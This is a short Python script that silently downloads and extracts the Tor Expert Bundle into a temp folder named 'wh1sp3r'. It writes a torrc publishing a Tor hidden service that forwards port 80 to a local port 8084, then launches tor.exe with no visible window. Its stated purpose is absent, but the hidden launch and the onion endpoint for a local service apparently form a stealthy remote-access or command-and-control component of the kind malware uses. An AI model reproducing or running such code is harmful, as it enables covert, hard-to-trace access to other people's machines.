import os
import requests
import tarfile
import tempfile
import subprocess
from subprocess import CREATE_NO_WINDOW

# Create a specific named temporary directory
temp_dir_name = "wh1sp3r"
temp_root = tempfile.gettempdir()
temp_dir = os.path.join(temp_root, temp_dir_name)
os.makedirs(temp_dir, exist_ok=True)

torrc_file_path = os.path.join(temp_dir, "torrc")
tor_exe_path = os.path.join(temp_dir, "tor", "tor.exe")

if not os.path.exists(tor_exe_path):
    # Download the Tor Expert Bundle
    url = "https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz"
    response = requests.get(url)
    tor_expert_bundle_path = os.path.join(temp_dir, "tor-expert-bundle.tar.gz")
    with open(tor_expert_bundle_path, "wb") as f:
        f.write(response.content)

    # Extract the archive
    with tarfile.open(tor_expert_bundle_path, "r:gz") as tar_ref:
        tar_ref.extractall(temp_dir)

    # Delete the downloaded file
    os.remove(tor_expert_bundle_path)

    # Create or modify the torrc configuration file
    torrc_content = rf"""
    Log notice file {temp_dir}\tor_log.txt
    GeoIPFile {temp_dir}\data\geoip
    GeoIPv6File {temp_dir}\data\geoip6
    HiddenServiceDir {temp_dir}\hidden_service
    HiddenServicePort 80 127.0.0.1:8084
    """
    with open(torrc_file_path, "w") as torrc_file:
        torrc_file.write(torrc_content)

# Run Tor without installing it as a service
subprocess.Popen([tor_exe_path, "-f", torrc_file_path], creationflags=CREATE_NO_WINDOW)
